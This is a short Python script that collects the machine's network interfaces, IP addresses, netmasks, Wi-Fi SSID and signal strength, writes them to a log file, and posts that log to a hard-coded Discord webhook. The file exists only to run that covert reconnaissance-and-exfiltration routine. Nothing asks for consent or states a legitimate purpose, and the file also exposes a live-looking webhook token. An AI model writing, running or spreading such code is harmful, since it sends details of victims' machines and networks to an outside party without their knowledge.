import subprocess
import requests
import json
import netifaces

# Discord Webhook URL
webhook_url = 'https://discord.com/api/webhooks/1260028879729332275/bhliony5asku0znPNm424ciasbyH9-qoj926nz3Z8yeHy7TPM5GvhNHGajpBW-HRnovA'

# Function to send message to Discord webhook
def send_to_discord(message):
    headers = {'Content-Type': 'application/json'}
    payload = json.dumps({'content': message})
    response = requests.post(webhook_url, headers=headers, data=payload)
    if response.status_code == 204:
        print(f"Message sent successfully to Discord webhook.")
    else:
        print(f"Failed to send message to Discord webhook. Status code: {response.status_code}")

# Function to execute command and capture output
def execute_command(command):
    result = subprocess.run(command, capture_output=True, text=True, shell=True)
    return result.stdout.strip()

# Function to get detailed network information
def get_network_info():
    interfaces = netifaces.interfaces()
    network_info = {}

    for iface in interfaces:
        addrs = netifaces.ifaddresses(iface)
        if netifaces.AF_INET in addrs:
            addresses = addrs[netifaces.AF_INET]
            network_info[iface] = addresses
    
    return network_info

# Function to get SSID and additional network details
def get_wifi_details():
    ssid = execute_command('iwgetid -r')
    signal_strength = execute_command('iwconfig 2>&1 | grep Signal | cut -d "=" -f 3 | cut -d " " -f 1')

    return {
        'ssid': ssid,
        'signal_strength': signal_strength,
    }

# Collect detailed network and WiFi information
network_info = get_network_info()
wifi_details = get_wifi_details()

# Write collected information to log.txt
with open('log.txt', 'w') as f:
    f.write("=== Network Information ===\n")
    for iface, addresses in network_info.items():
        f.write(f"Interface: {iface}\n")
        for addr in addresses:
            f.write(f"IP Address: {addr['addr']}\n")
            f.write(f"Netmask: {addr['netmask']}\n")
            f.write(f"Broadcast Address: {addr['broadcast']}\n")
        f.write("\n")
    f.write(f"SSID: {wifi_details['ssid']}\n")
    f.write(f"Signal Strength: {wifi_details['signal_strength']} dBm\n")

# Send log.txt content to Discord webhook
with open('log.txt', 'r') as f:
    log_content = f.read()

send_to_discord(f"```{log_content}```")
